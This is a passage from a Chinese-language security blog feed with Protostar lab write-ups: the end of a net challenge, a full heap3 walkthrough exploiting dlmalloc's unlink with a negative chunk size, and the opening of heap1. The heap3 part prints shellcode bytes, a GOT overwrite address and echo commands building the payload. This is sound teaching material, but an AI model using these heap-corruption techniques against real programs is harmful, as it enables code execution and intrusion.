class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">  run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h1><p>同样和net1稍有不同，题目将4个随机数依次发给我们，最后需要我们将这四个数的和发过去。</p><p><img src="https://i.loli.net/2018/11/04/5bdea0b9ba400.png" alt=""><br>既然它是分次发送的数据，那我们就分次接收，最后将数据加起来再发回去就行了。</p><p>红框部分特别注意一下，为什么不直接将求出的和x打包，而是要同0xffffffff与运算之后再打包呢？</p><p>因为考虑到四个随机数相加很有可能会超过4byte，为了确保不会溢出，将和同0xffffffff与运算之后溢出位的1就置零了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>net部分的题目说复杂也复杂，说简单也简单。复杂就复杂在对网络相关的socket部分的理解，虽然理解不是很深刻也能做题，但总觉得不爽。抛开网络这部分来说，题目本身是比较简单的。涉及到的面也比较窄(指protostar里面的题目)。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x18-heap3</title>
      <link href="/2018/10/24/Liveoverflow-0x18-heap3/"/>
      <url>/2018/10/24/Liveoverflow-0x18-heap3/</url>
      
        <content type="html"><![CDATA[<p>unlink漏洞的利用。相比于之前的题目，综合性提高了不少。</p><a id="more"></a><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><hr><h1 id="Protostar-Heap3"><a href="#Protostar-Heap3" class="headerlink" title="Protostar Heap3"></a>Protostar Heap3</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.</strong></p><p><strong>This level is at /opt/protostar/bin/heap3</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"that wasn't too bad now, was it? @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *a, *b, *c;</span><br><span class="line"></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  b = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  c = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(a, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(b, argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(c, argv[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"dynamite failed?\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h1><p>首先需要大致了解malloc的相关知识，从网上找各种资料和图片都有细微的差异，虽然有些枯燥，但还是看源码实在一些。</p><p>这是<code>malloc_chunk</code>在malloc.c中的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由此可以画出chunk结构示意图(简化)：</p><p><img src="https://i.imgur.com/VVU18jG.jpg" alt=""></p><p><code>prev_size</code>存储前一个块的大小，<code>size</code>存储当前块的大小。 块大小将始终是8字节的倍数，用于对齐，这意味着size的3个最低位始终为0。 <code>malloc</code>使用这三个位，最低有效位将指示前一个块是allocated还是free。 调用<code>malloc</code>时，它会初始化<code>prev_size</code>和<code>size</code>，并在之后返回内存的地址（上图中的<code>mem</code>）。已使用的块，会忽略<code>fd</code>和<code>bk</code>，并将其内存用于程序数据。</p><p>当一个块是<code>free</code>的时候，它会被存储在双链表结构中，并且<code>fd</code>(<strong>forward</strong>)包含下一个<code>free chunk</code>的地址，<code>bk</code>(<strong>backward</strong>)包含前一个<code>free chunk</code>的地址。因此，这些指针覆盖<code>free chunk</code>中的mem的开头八个字节。</p><p>大致了解后进gdb看看究竟是怎么回事</p><pre><code>(gdb) set disassembly-flavor intel(gdb) set pagination off(gdb) disassemble mainDump of assembler code for function main:0x08048889 &lt;main+0&gt;:    push   ebp0x0804888a &lt;main+1&gt;:    mov    ebp,esp0x0804888c &lt;main+3&gt;:    and    esp,0xfffffff00x0804888f &lt;main+6&gt;:    sub    esp,0x200x08048892 &lt;main+9&gt;:    mov    DWORD PTR [esp],0x200x08048899 &lt;main+16&gt;:   call   0x8048ff2 &lt;malloc&gt;0x0804889e &lt;main+21&gt;:   mov    DWORD PTR [esp+0x14],eax0x080488a2 &lt;main+25&gt;:   mov    DWORD PTR [esp],0x200x080488a9 &lt;main+32&gt;:   call   0x8048ff2 &lt;malloc&gt;0x080488ae &lt;main+37&gt;:   mov    DWORD PTR [esp+0x18],eax0x080488b2 &lt;main+41&gt;:   mov    DWORD PTR [esp],0x200x080488b9 &lt;main+48&gt;:   call   0x8048ff2 &lt;malloc&gt;0x080488be &lt;main+53&gt;:   mov    DWORD PTR [esp+0x1c],eax0x080488c2 &lt;main+57&gt;:   mov    eax,DWORD PTR [ebp+0xc]0x080488c5 &lt;main+60&gt;:   add    eax,0x40x080488c8 &lt;main+63&gt;:   mov    eax,DWORD PTR [eax]0x080488ca &lt;main+65&gt;:   mov    DWORD PTR [esp+0x4],eax0x080488ce &lt;main+69&gt;:   mov    eax,DWORD PTR [esp+0x14]0x080488d2 &lt;main+73&gt;:   mov    DWORD PTR [esp],eax0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;0x080488da &lt;main+81&gt;:   mov    eax,DWORD PTR [ebp+0xc]0x080488dd &lt;main+84&gt;:   add    eax,0x80x080488e0 &lt;main+87&gt;:   mov    eax,DWORD PTR [eax]0x080488e2 &lt;main+89&gt;:   mov    DWORD PTR [esp+0x4],eax0x080488e6 &lt;main+93&gt;:   mov    eax,DWORD PTR [esp+0x18]0x080488ea &lt;main+97&gt;:   mov    DWORD PTR [esp],eax0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;0x080488f2 &lt;main+105&gt;:  mov    eax,DWORD PTR [ebp+0xc]0x080488f5 &lt;main+108&gt;:  add    eax,0xc0x080488f8 &lt;main+111&gt;:  mov    eax,DWORD PTR [eax]0x080488fa &lt;main+113&gt;:  mov    DWORD PTR [esp+0x4],eax0x080488fe &lt;main+117&gt;:  mov    eax,DWORD PTR [esp+0x1c]0x08048902 &lt;main+121&gt;:  mov    DWORD PTR [esp],eax0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;0x0804890a &lt;main+129&gt;:  mov    eax,DWORD PTR [esp+0x1c]0x0804890e &lt;main+133&gt;:  mov    DWORD PTR [esp],eax0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;0x08048916 &lt;main+141&gt;:  mov    eax,DWORD PTR [esp+0x18]0x0804891a &lt;main+145&gt;:  mov    DWORD PTR [esp],eax0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;0x08048922 &lt;main+153&gt;:  mov    eax,DWORD PTR [esp+0x14]0x08048926 &lt;main+157&gt;:  mov    DWORD PTR [esp],eax0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;0x0804892e &lt;main+165&gt;:  mov    DWORD PTR [esp],0x804ac270x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;0x0804893a &lt;main+177&gt;:  leave0x0804893b &lt;main+178&gt;:  retEnd of assembler dump.(gdb) b *0x080488beBreakpoint 1 at 0x80488be: file heap3/heap3.c, line 18.(gdb) b *0x080488f2Breakpoint 2 at 0x804880a: file heap3/heap3.c, line 22.(gdb) b *0x0804892eBreakpoint 3 at 0x804892e: file heap3/heap3.c, line 28.</code></pre><p>分别在第三个<code>malloc</code>后，<code>strcpy</code>后，第三个<code>free</code>后下断点。</p><p><img src="https://i.imgur.com/fw4Qifr.png" alt="123"><br>找到heap地址<strong>0x804c00</strong></p><p><img src="https://i.imgur.com/NgNLg77.png" alt=""></p><p><img src="https://i.imgur.com/a7vyOnN.png" alt=""><br>查看堆，每个颜色代表一个<strong>chunk</strong>，可以看到<strong>chunk</strong>的结构和上面的示意图一样。我们在size字段中看到0x29，则当前块的大小为40（0x28），并且前一个块正在使用中。一切都符合预期，继续。</p><p><img src="https://i.imgur.com/9It77IJ.png" alt=""><br>三个<code>free</code>运行后，意料之外的情况发生了，chunk被<code>free</code>之后，<code>fd</code>被正确设置了，但是<code>bk</code>貌似没有被设置，而且后两个0x29应该变成0x28来指示前面的chunk是<code>free</code>的状态才对。哪里出了问题呢？</p><h1 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h1><blockquote></blockquote><pre><code>/*FastbinsAn array of lists holding recently freed small chunks.  Fastbinsare not doubly linked.  It is faster to single-link them, andsince chunks are never removed from the middles of these lists,double linking is not necessary. Also, unlike regular bins, theyare not even processed in FIFO order (they use faster LIFO) sinceordering doesn&apos;t much matter in the transient contexts in whichfastbins are normally used.Chunks in fastbins keep their inuse bit set, so they cannotbe consolidated with other free chunks. malloc_consolidatereleases all chunks in fastbins and consolidates them withother free chunks.*/</code></pre><p><em>摘自<strong>malloc.c</strong></em></p><p><img src="https://i.imgur.com/gfFdfsx.png" alt=""></p><p>当块的大小不足80字节时，malloc将使用简化的数据结构(fastbins)并且忽略掉<code>prev_size</code>、<code>bk</code>和<code>prev_inuse</code>位。所以fastbins是采用单链表的形式链接的，这点不同于其他bins。</p><p>因此我们构造的chunk的大小必须要大于fastbins所规定的最大值，让malloc把我们构造的chunk不视为fastbins，才能利用free中的unlink漏洞。</p><h1 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h1><p>当free一个chunk时，如果存在与这个chunk相邻的free chunk，则free将它们合并为更大的free chunk，存储在双链表中。</p><p><strong>free函数的数据定义</strong><br><img src="https://i.imgur.com/zrw2ipm.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span><span class="comment">//向前合并</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;<span class="comment">//判断前一个块是否为free块</span></span><br><span class="line">prevsize = p-&gt;prev_size;<span class="comment">//当前块的前一个块大小赋值给prevsize</span></span><br><span class="line">size += prevsize;<span class="comment">//自身大小加上前一个块的大小</span></span><br><span class="line">p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));<span class="comment">//指向当前块的p指针指向前一个块</span></span><br><span class="line">unlink(p, bck, fwd);<span class="comment">//unlink当前块(刚才块前面的那个块)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;<span class="comment">//判断下一个块是否为top_chunk(边界判定)</span></span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<span class="comment">//取当前块的下下个块的prev_inuse位，以此判断下一个块是不是free块</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* consolidate forward */</span><span class="comment">//向后合并</span></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;<span class="comment">//判断下一个块是否为free块</span></span><br><span class="line">unlink(nextchunk, bck, fwd);<span class="comment">//unlink后一个块</span></span><br><span class="line">size += nextsize;<span class="comment">//当前块大小加上后一个块大小</span></span><br><span class="line">&#125; <span class="keyword">else</span><span class="comment">//若下一个块不是free块</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//将下一个块的prev_inuse位置零</span></span><br></pre></td></tr></table></figure><p>以上是向前和向后合并的代码。结合注释可以很容易理解向前向后合并的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"><span class="comment">//将当前chunk插入unsorted bin的第一个和第二个chunk之间。</span></span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);<span class="comment">//设置当前chunk的size字段将前一个chunk标记为已使用。</span></span><br><span class="line">     set_foot(p, size);<span class="comment">//修改后一个chunk的prev_size字段，设置为当前chunk的size。</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr)((char*)(p) + (s)))-&gt;prev_size = (s))</span></span><br></pre></td></tr></table></figure><p>合并完成后就要将所合并的块放入unsorted bin中去并且进一步完善刚才合并的块(和本题没什么关系，但还是提一下)</p><p>然后再来看<code>unlink</code>(简化)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;</span></span><br><span class="line">  FD = P-&gt;fd;               </span><br><span class="line">  BK = P-&gt;bk;               </span><br><span class="line">  FD-&gt;bk = BK;              </span><br><span class="line">  BK-&gt;fd = FD;              </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面说了free块是存储在双链表结构中的，unlilnk的工作就是将free块从这个结构中取出来。在unlink中有两个临时指针变量<code>FD</code>和<code>BK</code>。示意图如下：</p><p><img src="https://i.imgur.com/HqkixGK.jpg" alt=""></p><p>所以unlink可以解释为：<strong>将p-&gt;bk的值写入地址为(p-&gt;fd)+12的内存，将p-&gt;fd的值写入地址为(p-&gt;bk)+8的内存。</strong></p><p>重点来了，如果我们可以控制p-&gt;bk和p-&gt;fd的值，理论上就可以覆盖任何内存了。<strong>所以我们可以考虑将fd覆盖为<code>printf</code>(题目中的最后一个函数)的got表项，将bk覆盖为我们放置shellcode的地址(heap中的某一处)，shellcode用来帮我们call <code>winner()</code></strong>，注意：got地址要先减去12来抵消赋值时的+12，除非shellcode超级短(≤8字节)，实际shellcode地址最好安放在表面shellcode地址(p-&gt;bk)+8之后，以免被free时的数据覆盖。</p><p>暂停一下，现在整理一下思路。结合前面的铺垫，先想一想我们现在能干什么。</p><p>首先我们需要构造两个chunk，一个chunk_A用来放置我们的got和shellcode地址；一个chunk_B大小超过fastbins，通过free掉chunk_B来触发chunk_A的unlink。</p><p>要触发chunk_A的unlink有两个条件。首先，A、B必须相邻，其次，A必须被malloc视为free chunk。那么一个很简单的思路就是将B放在A后面，然后将B的prev_inuse位置零，利用向前合并中的unlink<br>达到我们的目的。下面是示意图。</p><p><img src="https://i.imgur.com/ZbUvKIJ.png" alt=""><br>因为chunk_B(蓝框)大于fastbins，所以需要有prev_size位，我们将其设置为0x10以指示前一个块的大小为16字节，同时设置chunk_B的大小为0x64，其最低位为0，以指示前一个块为free状态。接着再依次设置chunk_A(红框)的size、fd和bk。这样看上去就可行了，但是实际上呢？</p><p>由于有的内存需要被0x00这种数据覆盖(比如0x00000011)也就是说我们的payload里面要出现0x00这种数据，而这是不可能实现的，因为strcpy在复制字符串时遇到空字符(0x00)会认为已经复制到了串尾于是停止复制。如果试图用非空字符串填充则会导致chunk_size太大，不仅不方便放置payload而且也没有那么多可用内存。所以貌似无论是B在A后面还是A在B后面都无法摆脱空字符这个问题。</p><p>用什么办法才能绕过空字符呢？</p><h1 id="Negative-Chunk-Size"><a href="#Negative-Chunk-Size" class="headerlink" title="Negative Chunk Size"></a>Negative Chunk Size</h1><p><img src="https://i.imgur.com/ucPIVN4.png" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr)(((char*)(p)) + (s)))</span></span><br></pre></td></tr></table></figure></p><p>可以看到，在free中得到nextchunk的位置的方法仅仅是用当前chunk的指针直接加上当前chunk的大小。</p><p>所以，如果一个chunk的大小是-4会怎么样？</p><p><img src="https://i.imgur.com/dQCduiz.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure><ul><li>malloc在确定chunk的大小时，会将size数据类型视为<code>unsigned int</code>，所以-4(0xfffffffc)远大于fastbins规定大小，所以就不会被视为fastbins。</li><li>注意到最后两bit，prev_inuse和is_mmapped都为0，所以他的前一个chunk会被视为free chunk。</li><li>这个块的前一个块地址为当前块起始地址-(-4)，也就是+4。后一个块的地址为当前块起始地址+(-4)，也就是-4。</li></ul><p>于是现在可以构造一个这样的chunk_A：</p><p><img src="https://i.imgur.com/6Pm8wmx.png" alt=""><br><strong>红框为chunk_A，其size和prev_size都是-4。将chunk_A放在chunk_B后面，当free掉chunk_B时，会检查chunk_A是否为free chunk，所以要检查chunk_A的next chunk(蓝框)的prev_inuse位，而next chunk的size正好是chunk_A的prev_size，就是0xfffffffc，所以，正好，prev_inuse位为0，意味着chunk_A是free chunk！</strong></p><p>ok，现在思路完整了。</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit!"></a>Exploit!</h1><p><img src="https://i.imgur.com/ZnLBJjM.png" alt=""></p><p>这是最终我们期望heap的内容，说一下为什么shellcode的地址不选在第一个chunk的开始(0x804c008)，因为题目中free调用了三次，所以当最后一个free调用时(第一个块被free时)，data部分前八字节会被其他数据覆盖，因此选择在后面一点(0x804c014)安放shellcode。</p><p><img src="https://i.imgur.com/aIK56er.png" alt=""><br>先找到got(<strong>0x804b128</strong>)和winner(<strong>0x8048864</strong>)，别忘了前面说过的got要减12！所以是<strong>0x804b11c</strong></p><p><img src="https://i.imgur.com/wrUe4QX.png" alt=""><br>然后在线汇编一下，拿到shellcode</p><pre><code>\xB8\x64\x88\x04\x08\xFF\xD0</code></pre><p>网址：<a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank" rel="noopener">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p><pre><code>user@protostar:/tmp$ echo -en &quot;AAAAAAAAAAAA\xB8\x64\x88\x04\x08\xFF\xD0&quot; &gt; AA   user@protostar:/tmp$ echo -ne &quot;BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x65&quot; &gt; BB   user@protostar:/tmp$ echo -ne &quot;CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x14\xc0\x04\x08&quot; &gt; CC</code></pre><p>构造payload</p><p><img src="https://i.imgur.com/UNbu1rM.png" alt=""><br>和预期一样</p><p><img src="https://i.imgur.com/2hbOnx8.png" alt=""><br>pwn！( ͡° ͜ʖ ͡°)✧</p><p>参考：<a href="https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13" target="_blank" rel="noopener">https://medium.com/@airman604/protostar-heap-3-walkthrough-56d9334bcd13</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x14-heap1</title>
      <link href="/2018/10/23/Liveoverflow-0x14-heap1/"/>
      <url>/2018/10/23/Liveoverflow-0x14-heap1/</url>
      
        <content type="html"><![CDATA[<p>进入新一部分的学习，<strong>heap</strong>(堆)</p><p>heap1，简单的利用strcpy溢出+覆写。</p><a id="more"></a><hr><h1 id="Protostar-Heap1"><a href="#Protostar-Heap1" class="headerlink" title="Protostar Heap1"></a>Protostar Heap1</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level takes a look at code flow hijacking in data overwrite cases.</strong></p><p><strong>This level is at /opt/protostar/bin/heap1</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">internet</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> priority;</span><br><span class="line">  <span class="keyword">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">winner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and we have a winner @ %d\n"</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">internet</span> *<span class="title">i1</span>, *<span class="title">i2</span>, *<span class="title">i3</span>;</span></span><br><span class="line"></span><br><span class="line">  i1 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i1-&gt;priority = <span class="number">1</span>;</span><br><span class="line">  i1-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  i2 = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct internet));</span><br><span class="line">  i2-&gt;priority = <span class="number">2</span>;</span><br><span class="line">  i2-&gt;name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(i1-&gt;name, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(i2-&gt;name, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"and that's a wrap folks!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>第一次接触堆类型题目肯定要先知道堆是什么，heap和stack都是存放数据的地方，简单来说，stack是系统自动分配变量或者调用函数需要用到的的空间，heap则是你自己开辟的空间(比如用<code>malloc</code>之类的函数开辟空间)，同时也需要手动释放空间(<code>free</code>)，分配方式类似于链表。stack的地址由高向低生长，相反，heap的地址是由低向高生长。</p><blockquote><p><em>Heap is used in C programs for dynamic memory management. libc provides an easy to use interface (<code>malloc</code>/<code>free</code>) to allocate and de-allocate memory regions. The version of libc in Protostar uses an implementation of malloc called dlmalloc, after the name of it’s original creator, Doug Lea. The control structures used by malloc are stored in-band with the data, which allows manipulation of the control structures when heap buffer overflow is possible, as above.</em></p></blockquote><p>干说不如实干，进gdb看一眼就明白了。</p><p><img 